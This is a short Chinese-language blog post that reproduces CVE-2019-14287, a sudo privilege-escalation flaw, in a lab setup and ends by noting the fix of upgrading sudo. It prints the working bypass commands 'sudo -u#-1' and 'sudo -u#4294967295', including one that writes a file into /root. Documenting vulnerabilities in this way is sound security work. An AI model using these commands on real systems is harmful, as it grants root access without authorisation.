---
title: CVE-2019-14287复现记录
tags:
  - CVE
  - 漏洞
categories: 信息安全
keywords:
  - CVE
  - 漏洞
description: sudo命令直接提权
cover: https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2020-3-24/BogImages/1585040230572.png
abbrlink: be5b30a1
date: 2019-10-18 00:00:00
---

## 日常睡前刷资讯消息

前两天16号晚上十二点多，日常刷资讯的时候，忽然瞅见了一篇文章说受限用户可以运行root命令
普通用户执行root指令，这不就权限绕过了嘛~
是个好东西

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571383854639.png)

这个漏洞是由苹果信息安全部门的大佬发现的，提供了漏洞的利用方式

> sudo -u#-1 id -u
> sudo -u#4294967295 id -u

这两个方式都可以
下面将本人复现记录放一下

## 动手复现

先添加一个账号tina

useradd tina
passwd tina
 然后在 /etc/sudoers这个文件中配置权限

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571386098956.png)

接着 su tina 切换用户

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571386133017.png)

尝试一下列出root目录内容

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571386167287.png)

然后利用漏洞看一下

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571385583872.png)

然后 试一下写入一个文件

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571385550973.png)

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571386335570.png)

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571385515949.png)


![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571385583872.png)

可以看到是无法写入的

利用漏洞写看一下
 sudo -u#-1 vim /root/xuzhiting.txt


![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571386318184.png)

![](https://marxcbr.oss-cn-shenzhen.aliyuncs.com/MARXCBR/2019-10-18/CVE-2019-14287复现记录/1571386372613.png)
可以看到已经在root目录下写入了我们的文件

## 我们还是修复一下下漏洞吧

修复该咋个处理？
这个漏洞修复可以通过升级sudo版本来完成

文章部分内容参考此处：https://www.sudo.ws/alerts/minus_1_uid.html


<center>要是感觉不错的话，就留个言评论一下下呀，欢迎各位大哥指正</center>